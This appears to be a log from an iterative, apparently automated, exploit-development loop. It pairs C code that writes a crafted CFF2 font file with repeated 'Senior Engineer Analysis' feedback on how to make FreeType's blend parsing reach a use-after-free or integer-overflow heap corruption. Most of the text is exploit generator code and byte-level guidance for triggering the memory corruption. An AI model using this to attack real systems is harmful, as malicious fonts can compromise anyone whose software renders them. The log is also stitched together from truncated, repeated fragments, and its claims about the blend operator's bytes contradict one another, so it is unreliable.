    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);

    /* FDSelect format 0: nGlyphs=0 (empty) */
    write_uint16(f, 0);          /* format 0 */
    /* No glyphs, so just format byte + no data */

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push numBlends = 1 */
    write_cff_byte_int(f, 1);    /* numBlends */
    /* Push 5 values (5 * 1) */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* After blend, push an integer to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;

    uint32_t private_offset = private_start - table_start;
    fseek(f, font_dict_start, SEEK_SET);
    if (private_len <= 107) {
        fputc(private_len + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_len >> 8) & 0xFF, f);
        fputc(private_len & 0xFF, f);
    }
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset <= 107) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    /* VariationStore header: format=1, variationRegionListOffset=8, itemVariationDataCount=0 */
    write_uint16(f, 1);
    write_uint32(f, 8);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Analysis

The previous PoC failed because the CFF2 header was malformed. The FreeType CFF2 loader expects a specific 5-byte header structure:

- Bytes 0-2: version_major, version_minor, header_size (must be >=5)
- Bytes 3-4: topDictLength (big-endian USHORT)

The PoC inserted an extra `offSize` (0x01) and a padding byte (0x00) at positions 3-4, causing `topDictLength` to be read as **0x0001** instead of the true top-dict size. Consequently, the top DICT parser only consumed 1 byte of actual dictionary data, missing all operators (FDArray, FDSelect, CharStrings, VariationStore). Without these operators, the font was not recognized as a CID-keyed CFF2 font; the FDArray was never parsed, the private dictionary was never loaded, and `cff_blend_doBlend` (called from `cff_parse_blend` during private-dict parsing) was never reached.

**Confirmed constants (from source code):**
- CFF2 header size: 5 bytes
- `topDictLength` at bytes 3-4, big-endian USHORT
- After the header, the top DICT data begins immediately (no extra bytes)
- CFF2 INDEX count is 4-byte ULONG (used in FDArray and CharStrings INDEX)

---

## Required changes to the PoC generator

### 1. Fix the CFF2 header
Replace the 5 incorrect header bytes (current bytes 0–4) with the proper structure:
```
Byte 0: 0x02          (major version 2)
Byte 1: 0x00          (minor version 0)
Byte 2: 0x05          (header_size = 5)
Bytes 3-4: (topDictLength as big-endian USHORT)
```
Remove the `offSize` and padding bytes. The top DICT data must start exactly at offset 5.

### 2. Update file positions
Because the header shrinks from 7 bytes to 5 bytes, all subsequent absolute offsets (`table_offset_pos`, `fdarray_op_pos`, `fdselect_op_pos`, `vstore_op_pos`) and computed `private_offset`, `fdarray_offset`, etc., will shift. Recalculate every offset and length accordingly.

### 3. Ensure `topDictLength` is correct
After building the top DICT (between `top_dict_start` and `top_dict_end`), write its computed length into bytes 3-4 of the header. This length **must** equal the number of bytes between `top_dict_start` and `top_dict_end`.

### 4. Verify INDEX structures
- FDArray INDEX: count (4 bytes), offSize (1 byte), offsets (count+1 × offSize), data.
- FDSelect: format 0 with nGlyphs=0 is valid, but for CFF2 with only 1 FD, the FDSelect may be omitted; however, keeping it works if the offset points to correct data.
- VariationStore: already minimal; ensure its offset is correctly calculated.

### 5. Confirm the blend operator is in the private dictionary
The private DICT must contain:
```
push numBlends          (1 byte CFF integer, e.g., 0x8C for 1)
push 5 values           (5 CFF integers)
0x0C 0x1A               (blend operator)
```
This is unchanged from the previous PoC.

---

**Root cause:** The header’s `topDictLength` was 1 instead of the actual size, so the top DICT parser read only 1 byte of dictionary data, skipping all operator entries that set up CID-keyed font structure. Without these entries, the font was treated as non-CID, the FDArray was not loaded, and the private dictionary (containing the blend operator) was never parsed.

**Exact byte offsets that must change:**  
- **Bytes 3-4** of the CFF2 data: replace `0x01 0x00` with the correct `topDictLength` (big-endian USHORT).  
- **All subsequent absolute file offsets** (table_offset, fdarray_op_pos, fdselect_op_pos, vstore_op_pos, private_start, etc.) must be decreased by 2 bytes because the header is now 5 bytes instead of 7.  
- The private DICT offset (stored in the Font DICT) must be recalculated relative to the new CFF2 data start.

After these corrections, the parse will proceed through the top DICT, load the FDArray, parse the Font DICT, and then parse the private dictionary, where the blend operator will execute `cff_blend_doBlend` with `numBlends=1` and trigger the vulnerability.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```

Senior Engineer Analysis:
**Final analysis**

The PoC failed because the `blend` operator was emitted with the wrong two‑byte sequence. In CFF2, the `blend` operator in a Private DICT has the code `12 24` (hex `0x0C 0x18`). The agent wrote `0x0C 0x1A` (12 26), which corresponds to a different operator that is not recognized as `blend`. Consequently, the DICT parser treated it as an unknown operator, cleared the stack, and never called `cff_parse_blend` – so the vulnerable code path in `cff_blend_doBlend` was not reached.

Additionally, the stack order for the blend operator is wrong. `cff_parse_blend` reads `numBlends` from `parser->top - 1` (the last element pushed). The required order is: push the `5 * numBlends` values first, then push `numBlends` last. The PoC pushed `numBlends` first and then the values, which would place `numBlends` at the bottom of the stack, not at the top.

**Required changes to the byte stream (offsets relative to CFF2 data start):**

1. **Correct the `blend` operator bytes**  
   At the position where the blend operator is written (just after the five values), change the two bytes from `0x0C 0x1A` to `0x0C 0x18`.

2. **Reverse the stack push order**  
   Push the five values (10, 20, 30, 40, 50) **before** pushing `numBlends` (1).  
   That is, the Private DICT data should be:
   ```
   5 bytes: value1 = 10   (byte = 10+139 = 0x95)
   5 bytes: value2 = 20   (0x9F)
   5 bytes: value3 = 30   (0xA9)
   5 bytes: value4 = 40   (0xB3)
   5 bytes: value5 = 50   (0xBD)
   5 bytes: numBlends = 1 (0x8C)
   2 bytes: blend operator (0x0C 0x18)
   ```
   After this, the top‑of‑stack will be `numBlends=1`, satisfying `cff_parse_blend`’s expectation.

3. **Verify VariationStore validity** (optional but recommended)  
   The `cff_parse_blend` function calls `cff_blend_build_vector`, which requires a valid VariationStore. The PoC’s VariationStore is minimal (format=1, regionListOffset=8, count=0), which may cause an error that prevents reaching `cff_blend_doBlend`. If the crash still does not occur after fixing the operator and stack order, increase `itemVariationDataCount` to 1 with a minimal `ItemVariationData` subtable (format=0, regionIndexCount=0, deltaSetCount=0, no delta sets). However, the immediate problem is the operator bytes; the VariationStore issue is secondary.

Apply these byte‑level corrections, and the parser will correctly invoke `cff_parse_blend` → `cff_blend_doBlend`, reaching the vulnerable code path.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

    fputc(fdarray_offset & 0xFF, f);

    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset <= 107) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
**Final Analysis**

**Root Cause:** The PoC font failed to trigger `cff_blend_doBlend` because the Private DICT operator `blend` (0x0C 0x18) was never executed. The CFF parser interprets the Private DICT only after correctly reading the Private DICT size and offset from the Font DICT. In the generator, the Font DICT’s Private DICT reference is malformed:

- The size operand is written as `write_cff_byte_int(f, 200)`, which is incorrect because `write_cff_byte_int` is designed for values ≤ 107. For `v=200`, it produces a single byte with value `(200+139) & 0xFF = 0x53` (83 decimal), not 200.
- The offset operand is written as `write_cff_byte_int(f, 0)` (a byte 0x8B), but the offset should point to the actual Private DICT location, not 0.
- Consequently, the CFF parser either (a) reads a bogus size and fails to find the Private DICT or (b) reads a size/offset that makes it skip the Private DICT entirely. The blend operator is never reached, so no crash occurs.

**Exact Structural Changes Required:**

1. **Compute `private_len` and `private_offset` correctly.**
   - `private_len` = number of bytes in the Private DICT (operands + operators). In the generator the Private DICT contains:
     - six single-byte integers: 10, 20, 30, 40, 50, 1  → 6 bytes
     - one blend operator: 0x0C 0x18 → 2 bytes
     - one trailing integer: 0 → 1 byte
     Total = 9 bytes.
   - `private_offset` = (position of first byte of Private DICT) – (position of first byte of CFF data, i.e., `table_start`). In the current file layout, after the CFF header (5 bytes), Top DICT (X bytes), FDArray (Y bytes), and FDSelect (Z bytes), the offset will be small but likely ≥ 108. We must use the correct multi-byte encoding (0x1C + 2 bytes big-endian) if `private_offset ≥ 108`.

2. **Rewrite the Font DICT’s Private DICT reference.**
   - The Font DICT currently starts at `font_dict_start`. It should contain exactly:
     - **Size operand** (9): encode as a 1‑byte integer `9+139 = 0x94` (148) because 9 < 108.
     - **Offset operand**: compute `private_offset`. If < 108, use `offset+139`; otherwise use 3‑byte encoding: `0x1C` followed by 16‑bit big‑endian value. Let `OFF = private_offset`. Then write:
       - `if OFF < 108`: `fputc(OFF + 139, f)`
       - `else`: `fputc(0x1C, f); fputc((OFF >> 8) & 0xFF, f); fputc(OFF & 0xFF, f)`
     - **Private DICT operator**: `fputc(0x12, f)`

3. **Remove the spurious `200` operand** that currently appears before the offset.

4. **Verify the Top DICT offsets for FDArray, FDSelect, CharStrings, and VariationStore.**  
   The current generator uses placeholder patching; ensure those offsets are relative to `table_start` and that the values fit the required encoding (using the appropriate CFF integer encoding for each offset). In particular, the `CharStrings` operator expects an offset to the CharStrings INDEX (which is an empty INDEX). The offset must be correct; otherwise the parser may abort before reaching the Private DICT.

5. **FDSelect format:** The generator writes `write_uint16(f, 0)` for FDSelect, which means “zero glyphs”. This is acceptable if the CharStrings INDEX is empty, but the parser might expect a valid FDSelect for any glyphs that exist. Since CharStrings has zero entries, the FDSelect is unused. However, some parsers may still validate FDSelect length. To be safe, you could increase FDSelect to cover 1 glyph (nGlyphs=1). But the existing empty CharStrings is likely fine.

6. **Adjust the blend operand value.**  
   To actually trigger the integer overflow in `cff_blend_doBlend`, the operand of the blend operator must be large. The vulnerability occurs when `numBlends` satisfies `5 * numBlends` overflows 32‑bit (e.g., `numBlends = 0x33333334`). Use the 3‑byte integer encoding (0x1C + 2 bytes) or the 5‑byte integer encoding (0x1D + 4 bytes) to push such a large value onto the stack. The exact byte sequence depends on the chosen encoding; for example, to push `0x33333334` (858993460), you would write: `0x1D` followed by the 4‑byte big‑endian value. Ensure that the Private DICT still parses correctly up to that point (the preceding operands are just integers that will be consumed as blend operands).

**Summary of Byte Offsets to Fix (in `/tmp/poc`):**

- **Font DICT region:** The byte(s) after the Font DICT start that currently encode the Private DICT size (currently 0x53) must be replaced with the correct length byte(s). The next bytes (the offset placeholder 0x8B) must be replaced with the correct offset encoding. Then the operator 0x12 must follow.

- **Blend operand:** Replace the current single byte 140 (numBlends=1) with a multi‑byte integer encoding of a value ≥ 0x33333334.

Once these corrections are made, the CFF parser will locate and parse the Private DICT, the blend operator will be processed with a huge `numBlends`, causing the integer overflow in `size = 5 * numBlends` and leading to an undersized reallocation, which then triggers a heap‑buffer overflow in the subsequent write loop.

Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.

**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator */
    write_cff_byte_int(f, 0);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    long offset1_pos = ftell(f);
    fputc(0x00, f);

    /* Font DICT: just Private operator with correct size and offset */
    long font_dict_start = ftell(f);
    /* We'll write size and offset after we know private_len and private_offset */
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);  /* size placeholder */
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);  /* offset placeholder */
    fputc(0x12, f);           /* Private operator */
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    write_uint16(f, 0);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push 5 values */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    /* Push numBlends = 1 */
    write_cff_byte_int(f, 1);
    /* Blend operator */
    fputc(0x0C, f); fputc(0x18, f);
    /* Push integer after blend to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    /* Patch Private DICT size and offset in Font DICT */
    fseek(f, priv_size_pos, SEEK_SET);
    /* private_len = 9, which is < 108, so use 1-byte encoding */
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}
```

```
CFF_FIELD_BLEND     ( 23,                            "blend" )
```

So the blend operator in CFF2 is **operator 23** (a single-byte operator, not `0x0C 0x18`). 

The previous payloads all used `0x0C 0x18` (the CFF1 blend operator), which is incorrect for CFF2. That's why the blend operator was never recognized and `cff_parse_blend` was never called.

The correct byte sequence for the CFF2 blend operator is simply byte value `23` (0x17).

Now let's identify all the specific structural issues with the previous attempt that prevented the font from being loaded successfully. Reading the fuzzer code, it calls `FT_New_Memory_Face` with face_index=-1 first. If that returns an error, the fuzzer exits immediately with return 0. The previous payload likely failed at `FT_New_Memory_Face` due to:

1. The OTTO header with table offsets might be valid, but the CFF2 table itself has structural problems that cause FreeType to reject the font.

- TopDict MUST have `CharStrings` (17) operator — the previous payload had it. Good.
- TopDict MUST have `FDArray` (0x124) and `FDSelect` (0x125) operators — the previous payload had them. Good.
- TopDict MUST have `vstore` (24) operator — the previous payload had it. Good.
- TopDict SHOULD have `FontMatrix` (0x107) — optional but recommended.
- TopDict has `maxstack` (25) — the previous payload didn't include it, which is fine (default applies).

The main problem is the **private dict blend operator value**. The CFF2 blend operator is `23` (single byte), not `0x0C 0x18`.

Let me also check the FDSelect format. FDSelect in CFF2 must have proper data. The previous payload wrote `write_uint16(f, 0)` which means nGlyphs = 0. But the CFF2 font needs at least one glyph to trigger the glyph loop in the fuzzer. However, looking at the fuzzer, it loops over `face->num_glyphs`. If num_glyphs is 0, the glyph loop body is never executed. But the vulnerability occurs during font loading (parsing the private dict), not during glyph loading. So even with 0 glyphs, if the private dict is parsed with the blend operator, it should trigger.

The key question: Is the private dict parsed even if there are 0 glyphs? In the CFF2 loading code, the private dict is parsed when loading the Font DICT (FDArray entry), which happens regardless of the number of glyphs. The FDArray parsing in `cff_font_load` at line 2242 iterates over `fd_index.count`. The previous payload set FDArray count = 1, so one Font DICT should be parsed, and within that, the private dict operator (18) triggers parsing of the private dict data.

The CFF2 Font DICT definition shows:
```
CFF_FIELD_CALLBACK( 18,    private_dict, "Private" )
```

So the private dict is a callback. The previous payload used `0x12` (18) as the private operator in the Font DICT, which is correct.

Now for the private dict data: the previous payload wrote some dummy values (10, 20, 30, 40, 50) followed by `1` (numBlends) and then the blend operator as `0x0C 0x18`. The issue is:
1. The blend operator byte sequence is wrong (should be `0x17` = 23, not `0x0C 0x18`).
2. The bytes before the blend operator are just numbers that get pushed onto the parser stack.

Looking at the CFF2 private dict fields in order:
- `BlueValues` (6) expects a delta array
- `OtherBlues` (7) expects a delta array
- etc.

The parser processes operators sequentially. The previous payload has bytes: 10, 20, 30, 40, 50 which are numbers followed by the blend operator. Assuming the parser treats these as numbers pushed onto the stack, then the blend operator should consume them based on `cff_parse_blend` which expects: numBlends on the stack, followed by the blend values.

Looking at `cff_parse_blend` in cffparse.c (line 875), it processes the blend operator. The first number on the stack is the blend count (numBlends), then pairs of numbers for each blend.

The previous payload wrote: `write_cff_byte_int(f, 1)` which writes the byte `1 + 139 = 140` (0x8C). Then it writes `fputc(0x0C, f); fputc(0x18, f)` which is the CFF1 blend operator.

So the fix is two-fold:
1. Change the blend operator from `0x0C 0x18` to single byte `0x17` (23).
2. Ensure the private dict structure is valid so that FreeType doesn't reject the font before reaching the blend operator.

Given the failed approaches, all previous attempts used the wrong blend operator. The fundamental error is that they all used `0x0C 0x18` which is the CFF1 blend operator. CFF2 uses operator 23 (0x17) as a single-byte operator.

Additionally, the payload needs a valid CFF2 structure. Let me verify the constant confirmed:
- CFF2 blend operator 23 confirmed as `0x17` (single byte) from cfftoken.h line `CFF_FIELD_BLEND     ( 23,                            "blend" )`

Now for what needs to change in the payload:

1. **Blend operator byte**: Replace `fputc(0x0C, f); fputc(0x18, f)` with `fputc(0x17, f)`.

2. **vsindex operator**: The CFF2 private dict also has `vsindex` (operator 22) which should come before blend. The previous payload didn't include a vsindex. The `cff_parse_blend` function might rely on a valid `vsindex` being set first. Looking at the code flow, `cff_parse_blend` calls `cff_blend_doBlend` which uses `subFont->vsindex`. If vsindex was never set, it could be 0, which might work, but to be safe, we should include `vsindex 0` before blend.

3. **Private dict length and offsets**: The previous payload wrote the private dict size and offset using a potentially incorrect encoding. The size was written as `fputc(private_len + 139, f)` which assumes private_len fits in a single byte (0-108 range). The offset was written similarly. These need to use the correct CFF byte encoding format.

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

}

    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);

```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Final Analysis

### Root Cause
The PoC failed to reach the vulnerable `cff_blend_doBlend` function because the **CharStrings INDEX is empty** (count = 0, written as `write_uint32(f, 0)`). This means `face->num_glyphs = 0`, and the fuzzer's glyph loop (`for (unsigned int glyph_index = 0; glyph_index < (unsigned int)face->num_glyphs; glyph_index++)`) never executes `FT_Load_Glyph`. Since the CFF2 private DICT containing the blend operator (0x17) is only parsed as part of glyph loading (via the FDSelect → FDArray → Private DICT chain), the private DICT is **never parsed**, and `cff_parse_blend` is never called.

Additionally, the **FDSelect format is incorrect** — it writes a bare `uint16(0)` instead of the proper CFF2 FDSelect format 0 structure, which requires a format byte followed by one FD index byte per glyph.

### Exact Byte Offsets and Changes Needed

Let’s define the byte positions relative to the start of the CFF2 table (position `table_start` in the PoC). The PoC uses `table_start` to compute offsets dynamically, but the structural errors are in the data layout.

#### 1. CharStrings INDEX (currently empty, count = 0)
**Location**: After the Global Subr INDEX (which is also empty). In the PoC, the CharStrings INDEX starts after the FDSelect section.

**Current bytes** (at the CharStrings start offset):
```
00 00 00 00   (count = 0)
```
This is 4 bytes (uint32 = 0).

**Required change**:  
Replace the 4-byte count field with a valid INDEX containing one empty charstring (just a single `endchar` byte 0x0E):

| Offset (from CFF2 start) | Bytes | Description |
|---|---|---|
| `charstrings_start` | `00 00 00 01` | Count = 1 (one glyph) |
| `charstrings_start + 4` | `00 00 00 02` | Offset array: first offset = 1 (base), second = 2 (one byte after the charstring) |
| `charstrings_start + 8` | `0E` | The charstring data: single `endchar` byte |

Total charstrings data: **9 bytes** instead of the previous 4 bytes.

#### 2. FDSelect (currently at offset `fdselect_start`)
**Location**: After the FDArray INDEX, before the Private DICT.

**Current bytes**:
```
00 00   (uint16 0)
```

This is interpreted as CFF2 FDSelect format 0 with no valid data. Since we now have 1 glyph, we need:

| Offset (from CFF2 start) | Bytes | Description |
|---|---|---|
| `fdselect_start` | `00` | Format = 0 (uint8) |
| `fdselect_start + 1` | `00` | FD index for glyph 0 = 0 (uint8) |

Total FDSelect: **2 bytes** (same byte count as before, but now correctly structured as 1-byte format + 1-byte index).

#### 3. Update All Offsets
Because the CharStrings INDEX grew from 4 bytes to 9 bytes (increase of 5 bytes), and the FDSelect remained the same size (2 bytes), all subsequent data structures shift by +5 bytes. The PoC dynamically computes offsets using `ftell()`, so if you regenerate with the additional 5 bytes of CharStrings data, the automatic offset calculations will adjust all pointers (FDArray offset, FDSelect offset, VariationStore offset, Private DICT offset) correctly.

Specifically, the following fields will automatically update because they are written via `ftell()`:
- Top DICT `FDArray` operand value (offset to FDArray)
- Top DICT `FDSelect` operand value
- Top DICT `CharStrings` operand value (now points to a non-empty INDEX)
- Top DICT `VariationStore` operand value
- Private DICT offset in Font DICT

You must **not** manually adjust these offsets; the generator’s existing `ftell()`-based logic will produce correct values as long as the data layout changes consistently.

#### 4. Verify Blend Operator Byte (0x17)
The PoC writes `fputc(0x17, f)` for the blend operator. From the source code at `cffparse.c:909`, `cff_parse_blend` is registered as the handler for this operator. The CFF2 specification confirms that the blend operator in a Private DICT is byte value 0x17. This value is **confirmed correct**.

### Summary of Code Changes

In the generator C code:

1. **Replace the CharStrings INDEX block** (currently `write_uint32(f, 0);`) with:
   - `write_uint32(f, 1);`   // count = 1
   - `write_uint16(f, 1);`   // offset[0] = 1 (base)
   - `write_uint16(f, 2);`   // offset[1] = 2 (end of charstring data)
   - `fputc(0x0E, f);`       // the charstring: endchar

2. **Replace the FDSelect block** (currently `write_uint16(f, 0);`) with:
   - `fputc(0x00, f);`       // format = 0
   - `fputc(0x00, f);`       // FD index for glyph 0 = 0

No other changes are needed. The offsets in top DICT will be recalculated automatically by the existing `ftell()`-based logic because the data stream size changes propagate forward.

With these corrections, the fuzzer will see `face->num_glyphs = 1`, call `FT_Load_Glyph(face, 0, flags)`, which will select Font DICT 0 via FDSelect, parse the Font DICT, find the Private DICT reference, parse the Private DICT, encounter the vsindex operator (0x16) then the blend operator (0x17), call `cff_parse_blend`, then `cff_blend_doBlend`, triggering the vulnerability.

